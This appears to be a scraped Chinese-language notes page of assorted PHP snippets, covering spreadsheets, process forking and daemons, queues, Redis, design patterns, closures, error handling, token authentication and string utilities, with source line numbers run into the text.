file_exists(__DIR__ . "$uri")) &#123; return false;&#125;/** * 加载入口文件 */require_once "./index.php";https://learnku.com/articles/28768#reply94663 phpexcel1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374https://github.com/PHPOffice/PhpSpreadsheetcomposer require phpoffice/phpspreadsheetrequire 'vendor/autoload.php';use PhpOffice\PhpSpreadsheet\Spreadsheet;use PhpOffice\PhpSpreadsheet\Writer\Xlsx;$spreadsheet = new Spreadsheet();$sheet = $spreadsheet-&gt;getActiveSheet();$sheet-&gt;setCellValue('A1', 'Hello World !');$writer = new Xlsx($spreadsheet);$writer-&gt;save('hello world.xlsx');php -S localhost:8000 -t vendor/phpoffice/phpspreadsheet/samples// 文件路径$inputFileName = './sampleData/example1.xls';$spreadsheet = \PhpOffice\PhpSpreadsheet\IOFactory::load($inputFileName);$reader = new \PhpOffice\PhpSpreadsheet\Reader\Xls();只要读取数据，不要格式时，实例读取器中 readDataOnly 属性，如下$inputFileType = 'Xls';$inputFileName = './sampleData/example1.xls';$reader = \PhpOffice\PhpSpreadsheet\IOFactory::createReader($inputFileType);/** 只要数据 **/$reader-&gt;setReadDataOnly(true);$spreadsheet = $reader-&gt;load($inputFileName);多个文件合并为一个对象$inputFileType = 'Csv';$inputFileNames = [ './sampleData/example1.csv', './sampleData/example2.csv' './sampleData/example3.csv'];$reader = \PhpOffice\PhpSpreadsheet\IOFactory::createReader($inputFileType);/** 拿到第一个 **/$inputFileName = array_shift($inputFileNames);$spreadsheet = $reader-&gt;load($inputFileName);$spreadsheet-&gt;getActiveSheet() -&gt;setTitle(pathinfo($inputFileName,PATHINFO_BASENAME));/** 循环读取 **/foreach($inputFileNames as $sheet =&gt; $inputFileName) &#123; /** 重新设置工作表索引 **/ $reader-&gt;setSheetIndex($sheet+1); /** 把文件当做一个新的工作表载入 **/ $reader-&gt;loadIntoExisting($inputFileName,$spreadsheet); /** 设置工作表标题 **/ $spreadsheet-&gt;getActiveSheet() -&gt;setTitle(pathinfo($inputFileName,PATHINFO_BASENAME));&#125;$spreadsheet = PhpOffice\PhpSpreadsheet\IOFactory::load("new.xls");$data = $spreadsheet -&gt;getSheet(0) // 指定第一个工作表为当前 -&gt;toArray(); // 转为数组// 或者得到全部工作表的数据数组 $cells=array();// 工作表对象有迭代器实现foreach ( $spreadsheet-&gt;getWorksheetIterator() as $data ) &#123; $cells = $data-&gt;toArray();&#125;https://learnku.com/articles/30048 PHP 多进程1234567891011121314151617181920212223242526272829303132333435363738394041424344$processNum = 4;$timeStart = time();$tasks = range(1, 20);$jobs = [];foreach ($tasks as $task) &#123; //这里讲返回的结果对4进行取模，存入4个数组，然后4个进程分别读取不同的数据进行处理 $jobs[$task % $processNum][] = $task;&#125;$mainPid = posix_getpid();echo "主进程：" . $mainPid . PHP_EOL;for ($i = 0; $i &lt; $processNum; $i++) &#123; $pid = pcntl_fork(); if ($pid == -1) &#123; //错误处理：创建子进程失败时返回-1. die('could not fork'); &#125; elseif ($pid) &#123; //父进程会得到子进程号，所以这里是父进程执行的逻辑 &#125; else &#123; // 子进程得到的$pid为0, 所以这里是子进程执行的逻辑。 $content = $jobs[$i]; $childStart = time(); foreach ($content as $v2) &#123; sleep(1); // 子进程执行的逻辑 &#125; $childEnd = time(); $childDiff = $childEnd - $childStart; echo "#" . posix_getpid() . "执行完毕，用时：" . $childDiff . "秒" . PHP_EOL; exit(); // 子进程执行完后必须退出，否则会循环的创建进程... &#125;&#125;//这里挂起主进程，等待子进程全部退出后再退出主进程while ($processNum &gt; 0) &#123; if ( pcntl_wait($status) &gt; 0) &#123; $processNum--; echo "#" . $pid . "退出" . PHP_EOL; &#125;&#125;$timeEnd = time();$diff = $timeEnd - $timeStart;echo '共计用时：' . $diff . '秒';https://learnku.com/laravel/t/30134 php 进程123456789101112后台运行if ($pid=pcntl_fork ()) exit (0);// 是父进程，结束父进程，子进程继续脱离控制终端，登录会话和进程组posix_setsid ();// 子进程升级组长进程，脱离原来的会话 / 终端禁止进程重新打开控制终端if ($pid=pcntl_fork ()) exit (0);// 结束第一子进程，第二子进程继续（第二子进程不再是会话组长）关闭打开的文件描述符fclose (STDIN),fclose (STDOUT),fclose (STDERR)// 关闭标准输入输出与错误显示。改变当前工作目录chdir("/")重设文件创建掩模umask (0);// 防止继承父级遗留下来的掩模 码模拟实现队列1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859define('MAXSIZE',5);//队列空间大小/** * @param $queue 队列存储空间 * @param $front 队列队头游标 * @param $near 队列队尾游标 * @param $data 进队的数据 * @return int */function enQueue(&amp;$queue,$front,$near,$data)&#123; if (($near+1)%MAXSIZE==$front)&#123; throw new RuntimeException("队空间已满"); &#125; $queue[$near%MAXSIZE] = $data; $near+=1; return $near;&#125;/** * 出队操作 * @param $queue * @param $front * @param $near * @return int */function deQueue(&amp;$queue,$front,$near)&#123; if ($front==$near%MAXSIZE)&#123; throw new RuntimeException("空队列"); &#125; $data = $queue[$front]; echo "出队元素：".$data.PHP_EOL; $front = ($front+1)%MAXSIZE; return $front;&#125;$a = [];//队列 使用数组模拟$front = $near = 0;//游标初始化$near = enQueue($a,$front,$near,1);$near = enQueue($a,$front,$near,2);$near = enQueue($a,$front,$near,3);$front = deQueue($a,$front,$near);$front = deQueue($a,$front,$near);$front = deQueue($a,$front,$near);//$front = deQueue($a,$front,$near);$near = enQueue($a,$front,$near,100);$front = deQueue($a,$front,$near);$near = enQueue($a,$front,$near,1);$near = enQueue($a,$front,$near,2);$near = enQueue($a,$front,$near,3);$near = enQueue($a,$front,$near,4);$front = deQueue($a,$front,$near);$front = deQueue($a,$front,$near);$front = deQueue($a,$front,$near);$front = deQueue($a,$front,$near);队列实现了先进先出 FIFO 的功能，在许多应用中如队列系统，排队买票等都应用到了，比如我们用的 redis 缓存系统中的列数据类型 List，它便能完成队列的功能https://learnku.com/articles/30430 夏令时1234567891011121314151617//判断美国那个时间段是否为夏令时function is_dst($timestamp)&#123; $timezone = date('e'); //获取当前使用的时区 date_default_timezone_set('US/Pacific-New'); //强制设置时区 $dst = date('I',$timestamp); //判断是否夏令时 date_default_timezone_set($timezone); //还原时区 return $dst; //返回结果&#125;https://gist.github.com/flowerains/6694812//获取当月第一天和最后一天 private function getthemonth($date) &#123; $firstday = date('Y-m-01', strtotime($date)); $lastday = date('Y-m-d', strtotime("$firstday +1 month -1 day")); return array($firstday, $lastday); &#125; 去除emoji12345678910111213function removeEmoji($text) &#123; $clean_text = ""; // Match Emoticons $regexEmoticons = '/[\x&#123;1F600&#125;-\x&#123;1F64F&#125;]/u'; $clean_text = preg_replace($regexEmoticons, '', $text); // Match Miscellaneous Symbols and Pictographs $regexSymbols = '/[\x&#123;1F300&#125;-\x&#123;1F5FF&#125;]/u'; $clean_text = preg_replace($regexSymbols, '', $clean_text); // Match Transport And Map Symbols $regexTransport = '/[\x&#123;1F680&#125;-\x&#123;1F6FF&#125;]/u'; $clean_text = preg_replace($regexTransport, '', $clean_text); return $clean_text;&#125; imagick等比缩放图片123456789101112131415161718192021222324252627282930313233343536373839404142/** * 使用imagick 等比缩放图片 * @param string $source_img 源图片地址 * @param string $target_img 缩放后图片地址 * @param int $with 缩放后图片宽度 * @param int $height 缩放后图片高度 */ public function imagick($source_img,$target_img,$with,$height)&#123; if(is_file($source_img))&#123; //判断源图片是否存在 $im = new Imagick(); &#125;else&#123; exit; &#125; $result = $im-&gt;readImage($source_img); $srcWH = $im-&gt;getImageGeometry(); //获取源图片宽和高 //图片等比例缩放宽和高设置 ，根据宽度设置等比缩放 if($srcWH['width']&gt;$with)&#123; $srcW['width'] = $with; $srcH['height'] = $srcW['width']/$srcWH['width']*$srcWH['height']; &#125;else&#123; $srcW['width'] = $srcWH['width']; $srcH['height'] = $srcWH['height']; &#125; //按照比例进行缩放 $im-&gt;thumbnailImage( $srcW['width'], $srcH['height'], true ); // 按照缩略图大小创建一个有颜色的图片 $new_img= new Imagick(); $new_img-&gt;newImage( $srcW['width'], $srcH['height'], 'white', 'jpg' ); //pink,black //合并图片 $new_img-&gt;compositeImage( $im, imagick::COMPOSITE_OVER, 0, 0); //生成图片 $new_img-&gt;setImageFileName($target_img); $new_img-&gt;writeImage(); //输出图片 header( "Content-Type: image/jpg" ); echo $new_img; &#125; &#125; https://gist.github.com/flowerains/beaab90b1bfc01054de3 redis支持php的序列化和反序列化12345678$redis = new Redis();$redis-&gt;connect('127.0.0.1', 6379, 1);$redis-&gt;setOption(Redis::OPT_SERIALIZER, Redis::SERIALIZER_PHP);$key = 'this_is_test';$value = ['15','12',15,'alex'];$name = $redis-&gt;rPush($key,$value);$result = $redis-&gt;lpop($key);var_dump($result); 一致性hash1234567891011121314// 整数hashfunction intHash($key)&#123; $md5 = substr(md5($key), 0, 8); $seed = 31; $hash = 0; for ($i = 0;$i &lt; 8; ++$i) &#123; $hash = $hash * $seed + ord(md5($i)); ++$i; &#125; return $hash &amp; 0x7FFFFFFF;&#125;$value = intHash('wangchuang') % 2;echo $value; 抽奖的经典算法1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586function get_rand($proArr) &#123; $result = ''; //概率数组的总概率精度 $proSum = array_sum($proArr); //概率数组循环 foreach ($proArr as $key =&gt; $proCur) &#123; $randNum = mt_rand(1, $proSum); if ($randNum &lt;= $proCur) &#123; $result = $key; break; &#125; else &#123; $proSum -= $proCur; &#125; &#125; unset ($proArr); return $result; &#125; $prize_arr = array( '0' =&gt; array('id'=&gt;1,'prize'=&gt;'平板电脑','v'=&gt;1), '1' =&gt; array('id'=&gt;2,'prize'=&gt;'数码相机','v'=&gt;5), '2' =&gt; array('id'=&gt;3,'prize'=&gt;'音箱设备','v'=&gt;10), '3' =&gt; array('id'=&gt;4,'prize'=&gt;'4G优盘','v'=&gt;12), '4' =&gt; array('id'=&gt;5,'prize'=&gt;'10Q币','v'=&gt;22), '5' =&gt; array('id'=&gt;6,'prize'=&gt;'下次没准就能中哦','v'=&gt;50), ); foreach ($prize_arr as $key =&gt; $val) &#123; $arr[$val['id']] = $val['v']; &#125; $rid = get_rand($arr); //根据概率获取奖项id $res['yes'] = $prize_arr[$rid-1]['prize']; //中奖项 unset($prize_arr[$rid-1]); //将中奖项从数组中剔除，剩下未中奖项 shuffle($prize_arr); //打乱数组顺序 for($i=0;$i&lt;count($prize_arr);$i++)&#123; $pr[] = $prize_arr[$i]['prize']; &#125; $res['no'] = $pr; echo json_encode($res); https://gist.github.com/flowerains/1e2e57906d496206a097$proArr = ['1'=&gt;65,'2'=&gt;20,'3'=&gt;5,'4'=&gt;5,'5'=&gt;5];$rank = get_rand($proArr);$i = 0;//统计次数$num1 = 0;$num2 = 0;$num3 = 0;$num4 = 0;$num5 = 0;$arr = array();do&#123; $rank = get_rand($proArr); switch ($rank) &#123; case 1: $num1++; break; case 2: $num2++; break; case 3: $num3++; break; case 4: $num4++; break; case 5: $num5++; break; &#125; $arr[] = $rank; $i++;&#125;while($i &lt; 100000);$value1 = number_format($num1/count($arr),4)*100;$value2 = number_format($num2/count($arr),4)*100;$value3 = number_format($num3/count($arr),4)*100;$value4 = number_format($num4/count($arr),4)*100;$value5 = number_format($num5/count($arr),4)*100;echo "1的中奖率%$value1\n";echo "2的中奖率%$value2\n";echo "3的中奖率%$value3\n";echo "4的中奖率%$value4\n";echo "5的中奖率%$value5\n"; 本月第一天123456789//上一周的周一周末 $start=date("Y-m-d",strtotime("2016-11-07"."-1 week Monday"));echo date("Y-m-d",strtotime("$start +6 day"));//下一周的周一周末$start=date("Y-m-d",strtotime("2016-11-07"."+1 week Monday")); echo date("Y-m-d",strtotime("$start +6 day")); //本月的第一天，最后一天 $start=date('Y-m-01', strtotime(date("Y-m-d"))); echo date('Y-m-d', strtotime("$start +1 month -1 day")); 多维数组转一维数组1234567891011121314151617181920212223242526272829303132333435363738394041424344&lt;?php$a=array( 0=&gt;array( 0=&gt;"a", 1=&gt;array( 0=&gt;'b' ) ), 1=&gt;array( 0=&gt;'c', 1=&gt;'d', 2=&gt;array( 0=&gt;array( "ddd"=&gt;array( 0=&gt;'e', "a"=&gt;'f', 1=&gt;'g' ) ) ) ), 'w'=&gt;'h');//获取未知维度数组最里面的值，换成一维数组https://3v4l.org/Mrjr1function get_array_value($data)&#123; $result=array(); array_walk_recursive($data,function($value) use (&amp;$result)&#123; array_push($result,$value); &#125;); return $result;&#125;print_r(get_array_value($a));Array( [0] =&gt; a [1] =&gt; b [2] =&gt; c [3] =&gt; d [4] =&gt; e [5] =&gt; f [6] =&gt; g [7] =&gt; h) 面向对象的三大特性123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157封装，继承，多态 面向对象的五大原则 单一职责原则，开放封闭原则，里氏替换原则，依赖倒置原则，接口隔离原则 /** * 输出一个字符串 * 装饰器动态添加功能 * Class EchoText */class EchoText&#123; protected $decorator = []; public function Index() &#123; //调用装饰器前置操作 $this-&gt;beforeEcho(); echo "你好，我是装饰器。"; //调用装饰器后置操作 $this-&gt;afterEcho(); &#125; //增加装饰器 public function addDecorator(Decorator $decorator) &#123; $this-&gt;decorator[] = $decorator; &#125; //执行装饰器前置操作 先进先出原则 protected function beforeEcho() &#123; foreach ($this-&gt;decorator as $decorator) $decorator-&gt;before(); &#125; //执行装饰器后置操作 先进后出原则 protected function afterEcho() &#123; $tmp = array_reverse($this-&gt;decorator); foreach ($tmp as $decorator) $decorator-&gt;after(); &#125;&#125;/** * 装饰器接口 * Class Decorator */interface Decorator&#123; public function before(); public function after();&#125;/** * 颜色装饰器实现 * Class ColorDecorator */class ColorDecorator implements Decorator&#123; protected $color; public function __construct($color) &#123; $this-&gt;color = $color; &#125; public function before() &#123; echo "&lt;dis style='color: &#123;$this-&gt;color&#125;'&gt;"; &#125; public function after() &#123; echo "&lt;/div&gt;"; &#125;&#125;/** * 字体大小装饰器实现 * Class SizeDecorator */class SizeDecorator implements Decorator&#123; protected $size; public function __construct($size) &#123; $this-&gt;size = $size; &#125; public function before() &#123; echo "&lt;dis style='font-size: &#123;$this-&gt;size&#125;px'&gt;**"; &#125; public function after() &#123; echo "&lt;/div&gt;"; &#125;&#125;//实例化输出类$echo = new EchoText();//增加装饰器$echo-&gt;addDecorator(new ColorDecorator('red'));//增加装饰器$echo-&gt;addDecorator(new SizeDecorator('22'));//输出$echo-&gt;Index();interface employee&#123; public function working();&#125;class teacher implements employee//具体应该依赖与抽象&#123; public function working()&#123; echo 'teaching...'; &#125;&#125;class coder implements employee&#123; public function working()&#123; echo 'coding...'; &#125;&#125;class workA//例子1&#123; public function work()&#123; $teacher = new teacher; $teacher-&gt;working(); &#125;&#125;class workB//例子2&#123; private $e; public function set(employee $e)&#123; $this-&gt;e = $e; &#125; public function work()&#123; $this-&gt;e-&gt;working(); &#125;&#125;$worka = new workA;//workA 依赖于 teacher 类 不符合依赖倒置原则$worka-&gt;work();$workb = new workB;//workB 不依赖与某个类 既可以注入 teacher 也可以 注入 coder$workb-&gt;set(new teacher());$workb-&gt;work();https://learnku.com/articles/30034#267039 PHP 并发123456789101112131415161718192021222324252627282930313233343536373839404142434445使用队列，额外起一个进程处理队列，并发请求都放到队列中，由额外进程串行处理，并发问题就不存在了，但是要额外进程支持以及处理延迟严重，本文不先不讨论这种方法。利用数据库事务特征，做原子更新，此方法需要依赖数据库的事务特性。借助文件排他锁，在处理下单请求的时候，用 flock 锁定一个文件，成功拿到锁的才能处理订单&lt;?php$http = new swoole_http_server("0.0.0.0", 9509); // 监听 9509$http-&gt;set(array( 'reactor_num' =&gt; 2, //reactor thread num 'worker_num' =&gt; 4 //worker process num));$http-&gt;on('request', function (swoole_http_request $request, swoole_http_response $response) &#123; $uniqid = uniqid('uid-', TRUE); // 模拟唯一用户ID $redis = new Redis(); $redis-&gt;connect('127.0.0.1', 6379); // 连接 redis $redis-&gt;watch('rest_count'); // 监测 rest_count 是否被其它的进程更改 $rest_count = intval($redis-&gt;get("rest_count")); // 模拟唯一订单ID if ($rest_count &gt; 0)&#123; $value = "&#123;$rest_count&#125;-&#123;$uniqid&#125;"; // 表示当前订单，被当前用户抢到了 // do something ... 主要是模拟用户抢到单后可能要进行的一些密集运算 $rand = rand(100, 1000000); $sum = 0; for ($i = 0; $i &lt; $rand; $i++) &#123;$sum += $i;&#125; // redis 事务 $redis-&gt;multi(); $redis-&gt;lPush('uniqids', $value); $redis-&gt;decr('rest_count'); $replies = $redis-&gt;exec(); // 执行以上 redis 事务 // 如果 rest_count 的值被其它的并发进程更改了，以上事务将回滚 if (!$replies) &#123; echo "订单 &#123;$value&#125; 回滚" . PHP_EOL; &#125; &#125; $redis-&gt;unwatch();&#125;);$http-&gt;start();使用 ab 测试https://learnku.com/articles/29686$ ab -t 20 -c 10 http://192.168.1.104:9509/ PHP 守护程序12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849// 编写一个简单daemon程序https://learnku.com/articles/30595$pid = pcntl_fork();switch($pid) &#123; case 0: // 2.子进程逻辑 $mypid = posix_getpid(); //echo "Son pid is $mypid\n"; // 3.升级组长进程 if (!$sid = posix_setsid()) &#123; exit("Set sid error\n"); &#125; // 4.防止组长进程再次控制终端 if (-1 == pcntl_fork()) &#123; exit("Fork error\n"); &#125; // 5.标准输入/输出/错误 fclose(STDIN); fclose(STDOUT); fclose(STDERR); // 6.改变目录 chdir("/"); // 7.重设掩码 umask(0); break; case -1: // fork err exit("Fork error\n"); break; default: // 1.父进程逻辑 $mypid = posix_getpid(); //echo "Parent pid is $mypid\n"; exit(); break;&#125;for ($i = 0; $i &lt; 10000; $i ++) &#123; file_put_contents("/tmp/wutao.log", "i=$i\n", FILE_APPEND);&#125;sleep(10); JSON_encode () 精度缺失1234567891011121314 $info = 26.54; $res = json_encode($info); var_dump($res);运行结果string(18) "26.539999999999999"serialize_precision = 16&gt;&gt;&gt; ini_get('serialize_precision')=&gt; "17"&gt;&gt;&gt; ini_set('serialize_precision',16)=&gt; "17"&gt;&gt;&gt; json_encode($info);=&gt; "26.54" 生成器1234567891011121314151617181920function getRange ($max = 10) &#123; for ($i = 1; $i &lt; $max; $i++) &#123; $injected = yield $i; if ($injected === 'stop') return; &#125;&#125;$generator = getRange(PHP_INT_MAX);传递参数到生成器中foreach ($generator as $range) &#123; if ($range === 10000) &#123; $generator-&gt;send('stop'); &#125; echo "Dataset &#123;$range&#125; &lt;br&gt;";&#125;注意: 在生成器中使用 return ，会跳出生成器。https://learnku.com/php/t/28336 字符串分割12345678910111213141516171819202122232425262728$str = '#本科 &amp; 硕士 @博士 - 教授'; $limit1 = array('#', '&amp;', '@', '-'); $limit2 = array('$#$', '$&amp;$', '$@$', '$-$'); $str2 = str_replace($limit1, $limit2, $str); $arr = array(); $arr1 = array_values(array_filter(explode('$', $str2))); foreach ($arr1 as $k =&gt; $v) &#123; if ($k % 2 == 0) &#123; $arr[] = array($v, $arr1[$k + 1]); &#125; &#125; print_r($arr); https://learnku.com/index.php/laravel/t/30777 $string = '#本科 &amp; 硕士 @博士 - 教授'; $matches = []; preg_match_all('/([#|&amp;|@|\-])([^#|&amp;|@|\-]*)/', $string, $matches); $signArr = array_map('trim', $matches[1]); $titleArr = array_map('trim', $matches[2]); # 在这以下的代码你可以自由发挥了 $data = []; $minCount = min(count($signArr), $titleArr); for ($i=0; $i&lt;$minCount; $i++) &#123; $data[] = [ $signArr[$i], $titleArr[$i], ]; &#125; 闭包和匿名函数123456789101112131415161718192021222324252627282930313233343536373839404142function callFunc1(Closure $closure) &#123; $closure();&#125;function callFunc2(Callable $callback) &#123; $callback();&#125;function xy() &#123; echo 'Hello, World!';&#125;$function = function() &#123; echo 'Hello, World!';&#125;;callFunc1("xy"); // Catchable fatal error: Argument 1 passed to callFunc1() must be an instance of Closure, string givencallFunc2("xy"); // Hello, World!callFunc1($function); // Hello, World!callFunc2($function); // Hello, World!//从php7.1开始可以使用以下代码转换callFunc1(Closure::fromCallable("xy"))其中 callable 参数可以为is_callable('functionName'); is_callable([$foo, 'bar']);//$foo-&gt;bar() is_callable(['foo','bar']);//foo::bar() is_callable(function()&#123;&#125;);//closurepublic function subscribeSellOrder(SellOrderProcess $sellOrderProcess)&#123; $closure = self::makeClosure($sellOrderProcess, 'sellOrdersProcess'); $this-&gt;redis-&gt;subscribe(RtdataConst::SELL_CHANNEL_NAME, $closure);&#125;protected static function makeClosure($obj, $method)&#123; return Closure::fromCallable([$obj, $method]);&#125;https://learnku.com/index.php/articles/30767 curl绑定host12345xxx.cn 测试的host为172.16.252.2$url = "http://172.16.252.2/api/test";$client = new Client(['emitter' =&gt; new \App\Services\GuzzleEmitter('test')]);$response = $client-&gt;get($url,array("timeout"=&gt;3,"connect_timeout"=&gt;2,'headers'=&gt;['host'=&gt;'xxx.cn'])); 错误和异常1234567891011121314151617181920212223242526272829303132https://learnku.com/articles/25813错误并不能被 try catch 捕捉Parse error 解析错误 Fatal error 致命错误 Warning 警告 Notice 注意error_report 设置错误的报告级别error_reporting(0);set_error_handler 设置用户自定义的错误处理函数set_error_handler('myErrorFun'); //把php原始的错误处理机制，变成我们的myErrorFun函数处理function myErrorFun($errno, $message, $file, $line)&#123; echo '错误码是：'.$errno.'&lt;/br&gt;'; echo '错误的信息是'.$message.'&lt;/br&gt;'; echo '错误的文件是：'.$file.'&lt;/br&gt;'; echo '错误的行数是'.$line;&#125;echo $a; //a是未定义的变量错误是由于 php 脚本自身的问题导致的和逻辑无关，异常则是由于逻辑问题导致的在 php7 之前错误不能用 try catch 捕获，异常可以 try &#123; throw new Exception("大江东去，浪淘尽，千古风流人物"); //抛出异常异常必须要手动抛出才行否则捕获不到 手动抛出异常是 php 比较鸡肋的地方，异常必须要手动抛出，才能捕获到，但是既然已经知道哪里会发生异常，直接规避不就可以了吗？或者重写逻辑，这可能是 php 比较特殊的地方吧&#125; catch (Exception $e) &#123; //系统内置的异常处理类 echo $e-&gt;getMessage(); //获取异常信息&#125;自定义的异常处理函数，用来处理没有用 try catch 捕获的异常，如果你抛出的异常无人捕获，那么就会进入该方法 set_exception_handler('myexception');function myexception($exception)&#123; var_dump($exception-&gt;getMessage());&#125;throw new Exception("测试一下自定义异常处理函"); 装饰器123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120封装，继承，多态什么是封装？把客观的事物封装成抽象的类，并且类可以把自己的数据和方法只让可信的类或者对象操作，对不可信的类进行信息的隐藏。简单的说就是：封装使对象的设计者与对象的使用者分开，使用者只要知道对象可以做什么就可以了，不需要知道具体是怎么实现的。封装可以有助于提高类和系统的安全性。什么是继承？继承指的是建立一个新的派生类，从一个或多个先前定义的类中继承数据和函数，可以重新定义或加进新数据和函数，从而建立了类的层次或等级。什么是多态？多态性指的是： 同一操作作用与不同类的实例，将产生不同的执行结果，即不同类的对象收到相同的消息时，将得到不同的结果。/** * 输出一个字符串 * 装饰器动态添加功能 * Class EchoText */class EchoText&#123; protected $decorator = []; public function Index() &#123; //调用装饰器前置操作 $this-&gt;beforeEcho(); echo "你好，我是装饰器。"; //调用装饰器后置操作 $this-&gt;afterEcho(); &#125; //增加装饰器 public function addDecorator(Decorator $decorator) &#123; $this-&gt;decorator[] = $decorator; &#125; //执行装饰器前置操作 先进先出原则 protected function beforeEcho() &#123; foreach ($this-&gt;decorator as $decorator) $decorator-&gt;before(); &#125; //执行装饰器后置操作 先进后出原则 protected function afterEcho() &#123; $tmp = array_reverse($this-&gt;decorator); foreach ($tmp as $decorator) $decorator-&gt;after(); &#125;&#125;/** * 装饰器接口 * Class Decorator */interface Decorator&#123; public function before(); public function after();&#125;/** * 颜色装饰器实现 * Class ColorDecorator */class ColorDecorator implements Decorator&#123; protected $color; public function __construct($color) &#123; $this-&gt;color = $color; &#125; public function before() &#123; echo "&lt;dis style='color: &#123;$this-&gt;color&#125;'&gt;"; &#125; public function after() &#123; echo "&lt;/div&gt;"; &#125;&#125;/** * 字体大小装饰器实现 * Class SizeDecorator */class SizeDecorator implements Decorator&#123; protected $size; public function __construct($size) &#123; $this-&gt;size = $size; &#125; public function before() &#123; echo "&lt;dis style='font-size: &#123;$this-&gt;size&#125;px'&gt;**"; &#125; public function after() &#123; echo "&lt;/div&gt;"; &#125;&#125;//实例化输出类$echo = new EchoText();//增加装饰器$echo-&gt;addDecorator(new ColorDecorator('red'));//增加装饰器$echo-&gt;addDecorator(new SizeDecorator('22'));//输出https://learnku.com/articles/30034$echo-&gt;Index(); 理解 cookie、session、token123456789101112131415session这对服务器说是一个巨大的开销 ， 严重的限制了服务器扩展能力， 比如说我用两个机器组成了一个集群， 小 F 通过机器 A 登录了系统， 那 session id 会保存在机器 A 上， 假设小 F 的下一次请求被转发到机器 B 怎么办？机器 B 可没有小 F 的 session id 啊。有时候会采用一点小伎俩：session sticky ， 就是让小 F 的请求一直粘连在机器 A 上， 但是这也不管用， 要是机器 A 挂掉了， 还得转到机器 B 去。那只好做 session 的复制了， 把 session id 在两个机器之间搬来搬去， 快累死了。小 F 已经登录了系统， 我给他发一个令牌 token， 里边包含了小 F 的 user id， 下一次小 F 再次通过 Http 请求访问我的时候， 把这个 token 通过 Http header 带过来不就可以了。*不过这和 session id 没有本质区别啊， 任何人都可以可以伪造， 所以我得想点儿办法， 让别人伪造不了。那就对数据做一个签名吧， 比如说我用 HMAC-SHA256 算法，加上一个只有我才知道的密钥， 对数据做一个签名， 把这个签名和数据一起作为 token， 由于密钥别人不知道， 就无法伪造 token 了。基于 Token 的身份验证的过程如下:用户通过用户名和密码发送请求。程序验证。程序返回一个签名的 token 给客户端。客户端储存 token, 并且每次用于每次发送请求。服务端验证 token 并返回数据。https://learnku.com/articles/30051 分割字符串1234567891011121314function mb_str_split($string): array &#123; if (is_string($string)) &#123; return preg_split('/(?&lt;!^)(?!$)/u', $string); &#125; return []; &#125; &gt;&gt;&gt; mb_str_split('我是谁') =&gt; [ "我", "是", "谁", ] 计算身份证的最后一位验证码1234567891011121314151617181920212223242526/** * @functionName 计算身份证的最后一位验证码 * @description 根据国家标准GB 11643-1999，前提必须是18位的证件号 *https://github.com/alicfeng/identity-card * @param string $idBody 证件号码的前17位数字 * * @return bool|mixed */ public static function calculateCode($idBody) &#123; if (17 != strlen($idBody)) &#123; return false; &#125; //加权因子 $factor = [7, 9, 10, 5, 8, 4, 2, 1, 6, 3, 7, 9, 10, 5, 8, 4, 2]; //校验码对应值 $code = ['1', '0', 'X', '9', '8', '7', '6', '5', '4', '3', '2']; $checksum = 0; foreach (range(0, strlen($idBody) - 1) as $index =&gt; $item) &#123; $checksum += substr($idBody, $index, 1) * $factor[$index]; &#125; return $code[$checksum % 11]; &#125; 简单工厂模式123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081使用简单工厂模式重新实现达到解耦的目的将加减乘除解耦，每一个运算用单独的类去写，再用工厂模式实例化出合适的对象，通过多态返回计算器结果，后面如果再加一个平方根运算可以新增一个平方根的类，如果需要修改加法运算，那就只需要修改 OperationAdd 类。class Operation&#123; public $num1; public $num2;&#125;class OperationAdd extends Operation&#123; public function getResult() &#123; $result = $this-&gt;num1 + $this-&gt;num2; return $result; &#125;&#125;class OperationSub extends Operation&#123; public function getResult() &#123; $result = $this-&gt;num1 - $this-&gt;num2; return $result; &#125;&#125;class OperationMul extends Operation&#123; public function getResult() &#123; $result = $this-&gt;num1 * $this-&gt;num2; return $result; &#125;&#125;class OperationDiv extends Operation&#123; public function getResult() &#123; if ($this-&gt;num2 != 0) &#123; $result = $this-&gt;num1 / $this-&gt;num2; &#125; else &#123; $result = "除数不能为0"; &#125; return $result; &#125;&#125;class OperationFactory&#123; public static function createOperate($symbol) &#123; switch ($symbol) &#123;//多态 case '+': $result = new OperationAdd(); break; case '-': $result = new OperationSub(); break; case '*': $result = new OperationMul(); break; case '/': $result = new OperationDiv(); break; default: $result = NULL; &#125; return $result; &#125;&#125;$operationFactory = OperationFactory::createOperate('+');$operationFactory-&gt;num1 = 21;$operationFactory-&gt;num2 = 11;echo $operationFactory-&gt;getResult();//32 https://learnku.com/articles/32491 array_reduce 多值化一1234567891011121314151617181920212223242526272829303132333435363738array_reduce 函数内部实现机制，更类似于如下代码 function array_reduce2($array, $callback, $initial=null)&#123; $acc = $initial; foreach($array as $a) $acc = $callback($acc, $a); return $acc; &#125; array_reduce2([2,4],function($carry,$x)&#123; return $carry+$x; &#125;); // 6 将一个序列函数的嵌套调用组合为 array_reduce 产生的新函数调用 function compose(...$functions)&#123; return array_reduce( $functions, function($carry,$function)&#123; return function($x)use($carry,$function)&#123; return $function($carry($x)); &#125;; &#125;, function($x)&#123; return $x; &#125; ); &#125; 效果 $compose = compose( // 加 2 function ($x) &#123; return $x + 2; &#125;, // 乘 4 function ($x) &#123; return $x * 4; &#125; ); $res = $compose(3); // （3+2）*4 = 20 https://learnku.com/articles/32417 过滤空白字符1234567891011121314$s=" 空白字符";&gt;&gt;&gt; strlen($s)=&gt; 18说明前2个字符长度为6，是全角空格&gt;&gt;&gt; json_encode([' '])=&gt; "["\u3000"]"&gt;&gt;&gt; preg_replace("/\s+/u", "",$s)=&gt; "空白字符"&gt;&gt;&gt; preg_replace("/\s+/", "",$s)=&gt; " 空白字符"&gt;&gt;&gt; preg_replace("/\x&#123;3000&#125;+/u",'',$s)=&gt; "空白字符"&gt;&gt;&gt; trim($s,' ')=&gt; "空白字符" curl 